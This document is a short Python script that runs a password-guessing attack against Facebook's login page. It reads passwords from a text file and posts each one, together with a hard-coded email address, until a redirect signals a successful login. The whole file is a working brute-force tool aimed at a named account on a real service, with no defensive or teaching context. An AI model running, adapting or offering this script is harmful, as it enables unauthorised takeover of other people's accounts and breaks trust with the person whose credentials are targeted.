import requests
import unicodedata
from bs4 import BeautifulSoup
import time
url="https://www.facebook.com/"
# print(send_data_url)
file=open('t.txt','r')
for password in file.readlines():
	data = {'email':'rresso03@gmail.com','pass':password.strip('\n')}
	send_data_url = requests.post(url, data=data,allow_redirects=False)
	soup=BeautifulSoup(send_data_url.text,'html.parser')
	text=soup.find('title').text
	by=text.encode('ASCII','replace')
	print(by.decode('ASCII'))
	nData = unicodedata.normalize('NFKD', text).encode('ASCII', 'ignore')
	print(nData.encode('ASCII','replace'))
	if(send_data_url.status_code==302):
		print("Ok")
		break